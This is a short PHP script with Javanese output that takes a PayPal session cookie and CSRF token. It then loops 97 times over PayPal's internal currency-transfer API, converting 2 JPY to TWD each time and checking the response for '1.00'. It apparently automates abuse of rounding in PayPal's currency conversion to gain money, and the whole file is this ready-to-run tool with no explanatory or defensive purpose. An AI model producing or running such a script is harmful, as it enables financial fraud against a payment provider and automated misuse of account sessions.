<?php
include 'curl.php';
function jpy($a, $cookie, $csrf){
	$headers = [
		'Host: www.paypal.com',
		'Accept: application/json',
		'X-Requested-With: XMLHttpRequest',
		'Save-Data: on',
		'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',
		'Content-Type: application/json',
		'Origin: https://www.paypal.com',
		'Sec-Fetch-Site: same-origin',
		'Sec-Fetch-Mode: cors',
		'Referer: https://www.paypal.com/myaccount/money/currencies/JPY/transfer/TWD/review',
		'Cookie: '.$cookie,];
		$body = '{
			"sourceCurrency":"JPY",
			"sourceAmount":2,
			"targetCurrency":"TWD",
			"_csrf":"'.$csrf.'"
		}';
		$curl = curl('https://www.paypal.com:443/myaccount/money/api/currencies/transfer', $body, $headers);
		$amount = fetch_value($curl,'"amount":"','"');
		if(strpos($curl, '1.00')){
			echo "Iso nuker | duite: $amount";
		}else{
			echo "Rampung";
		}
	}
	echo "Cookie: ";
	$cookie = trim(fgets(STDIN));
	echo "Csrf: ";
	$csrf = trim(fgets(STDIN));
	for($a=1;$a<=97;$a++){
		echo jpy($a, $cookie, $csrf)."\n";
		sleep(1);
	}
	
